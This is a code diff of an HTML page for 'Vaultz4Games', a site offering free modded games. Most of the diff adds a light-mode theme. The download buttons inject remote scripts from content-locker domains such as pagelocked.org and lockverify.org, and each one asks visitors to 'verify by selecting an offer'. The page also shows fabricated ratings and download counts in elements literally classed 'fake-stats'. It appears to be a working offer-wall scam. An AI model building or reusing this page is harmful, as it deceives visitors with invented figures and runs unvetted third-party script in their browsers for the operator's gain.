@@ -18,6 +18,12 @@
             background-attachment: fixed;
             color: #f0f0f0;
             line-height: 1.6;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        body.light-mode {
+            background: #f5f5f5 url('https://www.transparenttextures.com/patterns/white-texture.png') repeat;
+            color: #333;
         }
         
         .container {
@@ -31,7 +37,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 0;
+            padding: 25px 0 15px 0;
             margin-bottom: 30px;
             position: relative;
         }
@@ -42,21 +48,50 @@
             transform: translateX(-50%);
             text-align: center;
             padding-bottom: 15px;
-            width: 80%; /* Reduced width to create space on sides */
+            width: 80%;
             border-bottom: 1px solid #333;
-            margin: 0 auto; /* Center the logo */
+            margin: 0 auto;
+            cursor: pointer;
+        }
+
+        body.light-mode .logo {
+            border-bottom: 1px solid #ddd;
         }
         
         .logo h1 {
             font-size: 1.8rem;
-            color: #ff6f00;
+            background: linear-gradient(45deg, #FFA500, #ff6f00, #32CD32);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
             margin: 0;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            position: relative;
+            display: inline-block;
+            padding: 5px 10px;
+        }
+
+        .logo h1::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(255, 165, 0, 0.15), rgba(50, 205, 50, 0.15));
+            border-radius: 8px;
+            z-index: -1;
         }
         
         .logo p {
-            color: #ccc;
+            color: #ffb74d;
             font-size: 0.9rem;
             margin: 5px 0 0 0;
+            font-weight: 500;
+        }
+
+        body.light-mode .logo p {
+            color: #ff6f00;
         }
         
         .hamburger-menu {
@@ -74,59 +109,12 @@
             margin: 3px 0;
             transition: 0.3s;
         }
-        
-        .dropdown-menu {
-            display: none;
-            position: absolute;
-            top: 70px;
-            right: 20px;
-            background: #1e1e1e;
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,111,0,0.3);
-            z-index: 1000;
-            min-width: 200px;
+
+        body.light-mode .hamburger-menu span {
+            background: #ff6f00;
         }
-        
-        .dropdown-menu.active {
-            display: block;
-        }
-        
-        .dropdown-menu ul {
-            list-style: none;
-            padding: 10px 0;
-        }
-        
-        .dropdown-menu li {
-            padding: 10px 20px;
-            border-bottom: 1px solid #333;
-        }
-        
-        .dropdown-menu li:last-child {
-            border-bottom: none;
-        }
-        
-        .dropdown-menu a {
-            color: #fff;
-            text-decoration: none;
-            display: block;
-            transition: 0.3s;
-        }
-        
-        .dropdown-menu a:hover {
-            color: #ff6f00;
-        }
-        
-        .sub-menu {
-            display: none;
-            padding-left: 15px;
-            margin-top: 5px;
-        }
-        
-        .sub-menu.active {
-            display: block;
-        }
-        
+
+        /* Search Bar */
         .search-bar {
             margin: 25px auto;
             position: relative;
@@ -151,6 +139,114 @@
             transform: translateY(-50%);
             color: #666;
         }
+
+        /* Theme Toggle - Below Search Bar */
+        .theme-toggle-container {
+            display: flex;
+            justify-content: center;
+            margin: 10px 0 25px 0;
+        }
+
+        .theme-toggle {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #ffb74d;
+            transition: transform 0.3s;
+            padding: 8px 15px;
+            border-radius: 20px;
+            background: rgba(255, 111, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            transform: rotate(30deg);
+            background: rgba(255, 111, 0, 0.2);
+        }
+
+        body.light-mode .theme-toggle {
+            color: #ff6f00;
+            background: rgba(255, 111, 0, 0.15);
+        }
+
+        .theme-text {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #ffb74d;
+        }
+
+        body.light-mode .theme-text {
+            color: #000000; /* Black text in light mode */
+        }
+        
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 70px;
+            right: 20px;
+            background: #1e1e1e;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,111,0,0.3);
+            z-index: 1000;
+            min-width: 200px;
+        }
+
+        body.light-mode .dropdown-menu {
+            background: #ffffff;
+            border: 1px solid rgba(255,111,0,0.5);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .dropdown-menu.active {
+            display: block;
+        }
+        
+        .dropdown-menu ul {
+            list-style: none;
+            padding: 10px 0;
+        }
+        
+        .dropdown-menu li {
+            padding: 10px 20px;
+            border-bottom: 1px solid #333;
+        }
+
+        body.light-mode .dropdown-menu li {
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .dropdown-menu li:last-child {
+            border-bottom: none;
+        }
+        
+        .dropdown-menu a {
+            color: #fff;
+            text-decoration: none;
+            display: block;
+            transition: 0.3s;
+        }
+
+        body.light-mode .dropdown-menu a {
+            color: #333;
+        }
+        
+        .dropdown-menu a:hover {
+            color: #ff6f00;
+        }
+        
+        .sub-menu {
+            display: none;
+            padding-left: 15px;
+            margin-top: 5px;
+        }
+        
+        .sub-menu.active {
+            display: block;
+        }
         
         .game-list {
             display: flex;
@@ -168,11 +264,22 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.5);
             border: 1px solid rgba(255,111,0,0.3);
             padding: 4px;
+            cursor: pointer;
+        }
+
+        body.light-mode .game-item {
+            background: #ffffff;
+            border: 1px solid rgba(255,111,0,0.5);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         
         .game-item:hover {
             transform: translateY(-3px);
             box-shadow: 0 6px 20px rgba(0,0,0,0.7);
+        }
+
+        body.light-mode .game-item:hover {
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
         }
         
         .game-image {
@@ -181,12 +288,16 @@
             flex-shrink: 0;
             border-radius: 6px 0 0 6px;
             overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
         .game-image img {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            object-position: center;
         }
         
         .game-details {
@@ -202,6 +313,10 @@
             font-weight: bold;
             margin-bottom: 4px;
             color: #fff;
+        }
+
+        body.light-mode .game-title {
+            color: #333;
         }
         
         .game-meta {
@@ -226,6 +341,10 @@
             -webkit-box-orient: vertical;
             overflow: hidden;
         }
+
+        body.light-mode .game-description {
+            color: #666;
+        }
         
         .game-tags {
             display: flex;
@@ -243,7 +362,7 @@
         }
         
         .game-tag.mod {
-            background: linear-gradient(45deg, #ff6f00, #ff8c00);
+            background: linear-gradient(45deg, #1e90ff, #32cd32);
         }
         
         .game-tag.apk {
@@ -259,6 +378,12 @@
             box-shadow: 0 8px 30px rgba(0,0,0,0.7);
             border: 1px solid rgba(255,111,0,0.3);
         }
+
+        body.light-mode .game-info {
+            background: rgba(255,255,255,0.95);
+            border: 1px solid rgba(255,111,0,0.5);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+        }
         
         .back-btn {
             background: #333;
@@ -271,6 +396,11 @@
             display: flex;
             align-items: center;
             gap: 5px;
+        }
+
+        body.light-mode .back-btn {
+            background: #ddd;
+            color: #333;
         }
         
         .game-header {
@@ -285,12 +415,16 @@
             border-radius: 10px;
             overflow: hidden;
             flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
         .game-header-image img {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            object-position: center;
         }
         
         .game-header-info {
@@ -301,6 +435,10 @@
             font-size: 1.5rem;
             margin-bottom: 10px;
             color: #fff;
+        }
+
+        body.light-mode .game-header-title {
+            color: #333;
         }
         
         .game-header-meta {
@@ -327,6 +465,10 @@
             color: #ffb74d;
             font-size: 0.9rem;
         }
+
+        body.light-mode .game-stat {
+            color: #ff6f00;
+        }
         
         .game-header-tags {
             display: flex;
@@ -344,6 +486,11 @@
             margin: 25px 0 15px;
             font-size: 1.1rem;
         }
+
+        body.light-mode .platform-banner {
+            background: rgba(255, 158, 74, 0.3);
+            color: #ff6f00;
+        }
         
         .platform-banner i {
             margin-right: 8px;
@@ -355,6 +502,10 @@
             margin: 25px 0;
             border-radius: 2px;
         }
+
+        body.light-mode .separator-line {
+            border: 1px solid rgba(255,183,77,0.5);
+        }
         
         .video-container {
             position: relative;
@@ -363,6 +514,7 @@
             overflow: hidden;
             border-radius: 10px;
             margin: 15px 0;
+            background: #000;
         }
         
         .video-container iframe {
@@ -373,6 +525,26 @@
             height: 100%;
             border: none;
             border-radius: 10px;
+        }
+
+        .video-placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1a1a1a;
+            color: #fff;
+            border-radius: 10px;
+            font-size: 1.2rem;
+        }
+
+        body.light-mode .video-placeholder {
+            background: #f0f0f0;
+            color: #333;
         }
         
         .download-btn, .how-btn {
@@ -416,6 +588,11 @@
             color: #fff;
             margin-top: 10px;
         }
+
+        body.light-mode .how-btn {
+            background: #888;
+            color: #fff;
+        }
         
         .instruction-text {
             display: none;
@@ -424,6 +601,11 @@
             border-radius: 10px;
             margin-top: 10px;
             color: #ccc;
+        }
+
+        body.light-mode .instruction-text {
+            background: #f0f0f0;
+            color: #666;
         }
         
         .fake-stats {
@@ -434,6 +616,10 @@
             font-size: 0.9rem;
             color: #ffb74d;
             margin-top: 10px;
+        }
+
+        body.light-mode .fake-stats {
+            color: #ff6f00;
         }
         
         .fake-stats i {
@@ -458,6 +644,12 @@
             font-weight: bold;
             transition: 0.3s;
         }
+
+        body.light-mode .page-number {
+            background: #ffffff;
+            border: 1px solid rgba(255,111,0,0.5);
+            color: #ff6f00;
+        }
         
         .page-number.active, .page-number:hover {
             background: #ff6f00;
@@ -470,6 +662,11 @@
             border-radius: 8px;
             margin-top: 40px;
             border: 1px solid rgba(255,111,0,0.3);
+        }
+
+        body.light-mode .about-section {
+            background: #ffffff;
+            border: 1px solid rgba(255,111,0,0.5);
         }
         
         .about-section h2 {
@@ -485,6 +682,10 @@
             color: #ccc;
             line-height: 1.5;
             font-size: 0.85rem;
+        }
+
+        body.light-mode .about-section p {
+            color: #666;
         }
         
         /* Overlay */
@@ -503,6 +704,11 @@
             align-items: center;
             text-align: center;
             padding: 20px;
+        }
+
+        body.light-mode #browserOverlay {
+            background: rgba(255,255,255,0.95);
+            color: #333;
         }
         
         #browserOverlay h2 {
@@ -530,6 +736,10 @@
             color: #fff;
             font-size: 2rem;
             cursor: pointer;
+        }
+
+        body.light-mode #overlayClose {
+            color: #333;
         }
         
         /* Responsive adjustments */
@@ -588,10 +798,11 @@
 <div class="container">
     <!-- Header with Hamburger Menu -->
     <header>
-        <div class="logo">
+        <div class="logo" onclick="goHome()">
             <h1>Vaultz4Games</h1>
             <p>100% working anime & top games for PC & Mobile</p>
         </div>
+        
         <div class="hamburger-menu" id="hamburgerMenu">
             <span></span>
             <span></span>
@@ -621,6 +832,14 @@
     <div class="search-bar">
         <input type="text" id="searchInput" placeholder="Search games..." onkeyup="filterGames()">
         <i class="fas fa-search"></i>
+    </div>
+
+    <!-- Theme Toggle - Below Search Bar -->
+    <div class="theme-toggle-container">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle dark/light mode">
+            <i class="fas fa-moon"></i>
+            <span class="theme-text">Switch to Light Mode</span>
+        </button>
     </div>
 
     <!-- Game List -->
@@ -778,7 +997,9 @@
         </div>
         
         <div class="platform-banner"><i class="fas fa-gamepad"></i> PPSSPP Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/50HDyaLFOuU" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/50HDyaLFOuU" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         <p><strong>PPSSPP Version:</strong> Optimized for Android & iOS. Run in PPSSPP emulator with unlimited money mod.</p>
         
         <div class="fake-stats">
@@ -786,7 +1007,7 @@
             <div>~856,321 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('animebattle-script','https://lockedapp.org/cl/js/9vq61g',2000)"><i class="fas fa-download"></i> Download PPSSPP <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('animebattle-script','https://pagelocked.org/cl/js/9vq61g')"><i class="fas fa-download"></i> Download PPSSPP <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('animebattle-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="animebattle-instructions" class="instruction-text">Verify by selecting an offer to get the PPSSPP game file. Requires PPSSPP emulator to play.</div>
         <div id="animebattle-script"></div>
@@ -819,14 +1040,16 @@
         </div>
         
         <div class="platform-banner"><i class="fas fa-desktop"></i> PC Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/Y1a_8oqtRJI" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/Y1a_8oqtRJI" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         
         <div class="fake-stats">
             <div><i class="fas fa-star"></i> 4.8/5</div>
             <div>~1,234,567 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('demon-pc-script','https://lockedapp.org/cl/js/n625kv',2000)"><i class="fas fa-desktop"></i> Download PC <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('demon-pc-script','https://lockverify.org/cl/js/n625kv')"><i class="fas fa-desktop"></i> Download PC <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('demon-pc-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="demon-pc-instructions" class="instruction-text">Verify by selecting an offer to get the PC game.</div>
         <div id="demon-pc-script"></div>
@@ -834,7 +1057,9 @@
         <div class="separator-line"></div>
 
         <div class="platform-banner"><i class="fas fa-mobile-alt"></i> Mobile Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/CTmUg2Zc8hs" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/CTmUg2Zc8hs" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         <p><strong>Mobile Version:</strong> Optimized for Android & iOS. Run in PPSSPP full drive.</p>
         
         <div class="fake-stats">
@@ -842,7 +1067,7 @@
             <div>~987,654 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('demon-mobile-script','https://lockedapp.net/cl/js/qnern3',2000)"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('demon-mobile-script','https://applocked.org/cl/js/qnern3')"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('demon-mobile-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="demon-mobile-instructions" class="instruction-text">Verify by selecting an offer to get the mobile game.</div>
         <div id="demon-mobile-script"></div>
@@ -874,7 +1099,9 @@
         </div>
         
         <div class="platform-banner"><i class="fas fa-mobile-alt"></i> Mobile Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/QtjRZTKUcdc" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/QtjRZTKUcdc" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         <p><strong>Mobile Version:</strong> Optimized for Android & iOS. Unlimited Money Mod.</p>
         
         <div class="fake-stats">
@@ -882,7 +1109,7 @@
             <div>~876,543 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('naruto-mobile-script','https://lockedapp.org/cl/js/grq5qp',2000)"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('naruto-mobile-script','https://pagelocked.org/cl/js/grq5qp')"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('naruto-mobile-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="naruto-mobile-instructions" class="instruction-text">Verify by selecting an offer to get the mobile game.</div>
         <div id="naruto-mobile-script"></div>
@@ -914,7 +1141,9 @@
         </div>
         
         <div class="platform-banner"><i class="fas fa-mobile-alt"></i> Mobile Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/ZwI5_1yNz5I" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/ZwI5_1yNz5I" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         <p><strong>Mobile Version:</strong> Optimized for Android & iOS. Unlimited Money Mod.</p>
         
         <div class="fake-stats">
@@ -922,7 +1151,7 @@
             <div>~765,432 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('onepiece-mobile-script','https://lockverify.org/cl/js/1x581p',2000)"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('onepiece-mobile-script','https://pagelocked.org/cl/js/1x581p')"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('onepiece-mobile-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="onepiece-mobile-instructions" class="instruction-text">Finish at least one offer to get One Piece game.</div>
         <div id="onepiece-mobile-script"></div>
@@ -954,7 +1183,9 @@
         </div>
         
         <div class="platform-banner"><i class="fas fa-mobile-alt"></i> Mobile Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/z8HAzlv61uc" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/z8HAzlv61uc" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         <p><strong>Mobile Version:</strong> Optimized for Android & iOS. Unlimited Money Mod included.</p>
         
         <div class="fake-stats">
@@ -962,7 +1193,7 @@
             <div>~1,200,000 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('solo-mobile-script','https://lockedapp.net/cl/js/n623pk',2000)"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('solo-mobile-script','https://lockverify.org/cl/js/n623pk')"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('solo-mobile-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="solo-mobile-instructions" class="instruction-text">Complete one verification offer to unlock the mobile download.</div>
         <div id="solo-mobile-script"></div>
@@ -994,7 +1225,9 @@
         </div>
         
         <div class="platform-banner"><i class="fas fa-mobile-alt"></i> Mobile Version</div>
-        <div class="video-container"><iframe src="https://www.youtube.com/embed/TxslurvnJXI" allowfullscreen></iframe></div>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/TxslurvnJXI" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
         <p><strong>Mobile Version:</strong> Stealth action adventure in an open world with RPG elements.</p>
         
         <div class="fake-stats">
@@ -1002,7 +1235,7 @@
             <div>~543,210 downloads</div>
         </div>
         
-        <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('hiddenones-script','https://pagelocked.org/cl/js/34oqgn',2000)"><i class="fas fa-download"></i> Download APK <span class="loading"></span></button>
+        <button class="download-btn" onclick="showLoading(this); loadScript('hiddenones-script','https://pagelocked.org/cl/js/34oqgn')"><i class="fas fa-download"></i> Download APK <span class="loading"></span></button>
         <button class="how-btn" onclick="toggleInstructions('hiddenones-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
         <div id="hiddenones-instructions" class="instruction-text">Verify by selecting an offer to get the APK file.</div>
         <div id="hiddenones-script"></div>
@@ -1010,171 +1243,166 @@
 </div>
 
 <script>
-    // Hamburger menu functionality
-    const hamburgerMenu = document.getElementById('hamburgerMenu');
-    const dropdownMenu = document.getElementById('dropdownMenu');
-    const topGamesLink = document.getElementById('topGamesLink');
-    const upcomingGamesLink = document.getElementById('upcomingGamesLink');
-    const topGamesMenu = document.getElementById('topGamesMenu');
-    const upcomingGamesMenu = document.getElementById('upcomingGamesMenu');
-    const pagination = document.getElementById('pagination');
-    const aboutSection = document.getElementById('aboutSection');
-    
-    hamburgerMenu.addEventListener('click', function() {
-        dropdownMenu.classList.toggle('active');
-    });
-    
-    topGamesLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        topGamesMenu.classList.toggle('active');
-        upcomingGamesMenu.classList.remove('active');
-    });
-    
-    upcomingGamesLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        upcomingGamesMenu.classList.toggle('active');
-        topGamesMenu.classList.remove('active');
-    });
-    
-    // Close dropdown when clicking outside
-    document.addEventListener('click', function(e) {
-        if (!hamburgerMenu.contains(e.target) && !dropdownMenu.contains(e.target)) {
-            dropdownMenu.classList.remove('active');
-            topGamesMenu.classList.remove('active');
-            upcomingGamesMenu.classList.remove('active');
+    // Theme toggle functionality
+    document.addEventListener('DOMContentLoaded', function() {
+        const themeToggle = document.getElementById('themeToggle');
+        const themeIcon = themeToggle.querySelector('i');
+        const themeText = themeToggle.querySelector('.theme-text');
+        
+        // Check for saved theme preference or default to dark
+        const savedTheme = localStorage.getItem('theme') || 'dark';
+        if (savedTheme === 'light') {
+            document.body.classList.add('light-mode');
+            themeIcon.className = 'fas fa-sun';
+            themeText.textContent = 'Switch to Dark Mode';
+        } else {
+            document.body.classList.remove('light-mode');
+            themeIcon.className = 'fas fa-moon';
+            themeText.textContent = 'Switch to Light Mode';
         }
-    });
-    
-    // Track navigation history
-    let navigationHistory = [];
-    
-    function showGame(id){
-        // Add current state to history
-        navigationHistory.push({
-            gameList: document.querySelector('.game-list').style.display,
-            pagination: pagination.style.display,
-            aboutSection: aboutSection.style.display,
-            activeGame: document.querySelector('.game-info[style*="display: block"]')?.id
+        
+        // Theme toggle click handler
+        themeToggle.addEventListener('click', function() {
+            document.body.classList.toggle('light-mode');
+            
+            if (document.body.classList.contains('light-mode')) {
+                themeIcon.className = 'fas fa-sun';
+                themeText.textContent = 'Switch to Dark Mode';
+                localStorage.setItem('theme', 'light');
+            } else {
+                themeIcon.className = 'fas fa-moon';
+                themeText.textContent = 'Switch to Light Mode';
+                localStorage.setItem('theme', 'dark');
+            }
         });
         
-        document.querySelector('.game-list').style.display = 'none';
-        document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
-        // Hide pagination and about section when viewing a game
-        pagination.style.display = 'none';
-        aboutSection.style.display = 'none';
+        // Browser overlay functionality
+        const overlay = document.getElementById('browserOverlay');
+        const overlayClose = document.getElementById('overlayClose');
         
-        const page = document.getElementById(id);
-        if (page) {
-            page.style.display = 'block';
-            page.style.boxShadow = "0 10px 35px rgba(0,0,0,0.7)";
-            window.scrollTo(0,0);
-        }
-        // Close dropdown menu when a game is selected
-        dropdownMenu.classList.remove('active');
-        topGamesMenu.classList.remove('active');
-        upcomingGamesMenu.classList.remove('active');
-    }
-    
-    function goBack(){
-        if (navigationHistory.length > 0) {
-            const previousState = navigationHistory.pop();
-            
-            document.querySelector('.game-list').style.display = previousState.gameList;
-            pagination.style.display = previousState.pagination;
-            aboutSection.style.display = previousState.aboutSection;
-            
-            document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
-            if (previousState.activeGame) {
-                document.getElementById(previousState.activeGame).style.display = 'block';
+        // Show overlay initially
+        overlay.style.display = 'flex';
+        
+        // Close overlay when X is clicked
+        overlayClose.addEventListener('click', function() {
+            overlay.style.display = 'none';
+        });
+        
+        // Hamburger menu functionality
+        const hamburgerMenu = document.getElementById('hamburgerMenu');
+        const dropdownMenu = document.getElementById('dropdownMenu');
+        
+        hamburgerMenu.addEventListener('click', function() {
+            dropdownMenu.classList.toggle('active');
+        });
+        
+        // Submenu functionality
+        const topGamesLink = document.getElementById('topGamesLink');
+        const topGamesMenu = document.getElementById('topGamesMenu');
+        const upcomingGamesLink = document.getElementById('upcomingGamesLink');
+        const upcomingGamesMenu = document.getElementById('upcomingGamesMenu');
+        
+        topGamesLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            topGamesMenu.classList.toggle('active');
+            upcomingGamesMenu.classList.remove('active');
+        });
+        
+        upcomingGamesLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            upcomingGamesMenu.classList.toggle('active');
+            topGamesMenu.classList.remove('active');
+        });
+        
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(e) {
+            if (!hamburgerMenu.contains(e.target) && !dropdownMenu.contains(e.target)) {
+                dropdownMenu.classList.remove('active');
+                topGamesMenu.classList.remove('active');
+                upcomingGamesMenu.classList.remove('active');
             }
-        } else {
-            // Fallback to default behavior
-            document.querySelector('.game-list').style.display = 'flex';
-            document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
-            // Show pagination and about section when going back to games list
-            pagination.style.display = 'flex';
-            aboutSection.style.display = 'block';
-        }
-    }
-    
-    function toggleInstructions(id){
-        const el = document.getElementById(id);
-        el.style.display = (el.style.display === 'block') ? 'none' : 'block';
-    }
-    
-    function loadScriptDelayed(containerId, src, delay){
-        setTimeout(() => {
-            const container = document.getElementById(containerId);
-            if (!container) return;
-            container.innerHTML = '';
-            const script = document.createElement('script');
-            script.src = src;
-            script.type = 'text/javascript';
-            script.id = 'ogjs';
-            container.appendChild(script);
-        }, delay);
-    }
-    
-    function showLoading(button){
-        const spinner = button.querySelector('.loading');
-        if (!spinner) return;
-        spinner.style.display = 'inline-block';
-        setTimeout(()=>{ spinner.style.display = 'none'; }, 4000);
-    }
+        });
 
-    // Search functionality
+        // Auto-close browser overlay after 6 seconds
+        setTimeout(function() {
+            if (overlay) overlay.style.display = 'none';
+        }, 6000);
+    });
+    
+    // Game display functions
+    function showGame(gameId) {
+        document.getElementById('gameList').style.display = 'none';
+        document.getElementById('pagination').style.display = 'none';
+        document.getElementById('aboutSection').style.display = 'none';
+        document.getElementById(gameId).style.display = 'block';
+    }
+    
+    function goBack() {
+        const gameInfos = document.querySelectorAll('.game-info');
+        gameInfos.forEach(info => {
+            info.style.display = 'none';
+        });
+        
+        document.getElementById('gameList').style.display = 'flex';
+        document.getElementById('pagination').style.display = 'flex';
+        document.getElementById('aboutSection').style.display = 'block';
+    }
+    
+    function goHome() {
+        goBack();
+    }
+    
     function filterGames() {
         const input = document.getElementById('searchInput');
         const filter = input.value.toLowerCase();
-        const gameList = document.getElementById('gameList');
-        const games = gameList.getElementsByClassName('game-item');
+        const gameItems = document.querySelectorAll('.game-item');
         
-        for (let i = 0; i < games.length; i++) {
-            const title = games[i].getElementsByClassName('game-title')[0];
-            const description = games[i].getElementsByClassName('game-description')[0];
-            const tags = games[i].getElementsByClassName('game-tag');
-            
-            let titleText = title.textContent || title.innerText;
-            let descriptionText = description.textContent || description.innerText;
-            
-            // Check if search term matches title, description, or any tag
-            let matchFound = false;
-            
-            if (titleText.toLowerCase().indexOf(filter) > -1) {
-                matchFound = true;
-            } else if (descriptionText.toLowerCase().indexOf(filter) > -1) {
-                matchFound = true;
+        gameItems.forEach(item => {
+            const title = item.querySelector('.game-title').textContent.toLowerCase();
+            if (title.includes(filter)) {
+                item.style.display = 'flex';
             } else {
-                // Check tags
-                for (let j = 0; j < tags.length; j++) {
-                    const tagText = tags[j].textContent || tags[j].innerText;
-                    if (tagText.toLowerCase().indexOf(filter) > -1) {
-                        matchFound = true;
-                        break;
-                    }
-                }
+                item.style.display = 'none';
             }
-            
-            if (matchFound) {
-                games[i].style.display = "flex";
-            } else {
-                games[i].style.display = "none";
-            }
+        });
+    }
+    
+    function showLoading(button) {
+        const loading = button.querySelector('.loading');
+        loading.style.display = 'inline-block';
+        
+        // Simulate loading delay
+        setTimeout(() => {
+            loading.style.display = 'none';
+        }, 3000);
+    }
+    
+    function toggleInstructions(id) {
+        const instructions = document.getElementById(id);
+        if (instructions.style.display === 'block') {
+            instructions.style.display = 'none';
+        } else {
+            instructions.style.display = 'block';
         }
     }
 
-    document.addEventListener("DOMContentLoaded", function() {
-        const overlay = document.getElementById("browserOverlay");
-        const closeBtn = document.getElementById("overlayClose");
-        if (closeBtn && overlay) {
-            closeBtn.addEventListener("click", function() {
-                overlay.style.display = "none";
-            });
-        }
-        setTimeout(function() {
-            if (overlay) overlay.style.display = "none";
-        }, 6000);
-    });
+    // Script loading function
+    function loadScript(containerId, src) {
+        const container = document.getElementById(containerId);
+        if (!container) return;
+        
+        // Clear any existing script
+        container.innerHTML = '';
+        
+        // Create and append the script
+        const script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.id = 'ogjs';
+        script.src = src;
+        container.appendChild(script);
+        
+        console.log('Loading script:', src);
+    }
 </script>
 </body>
 </html>
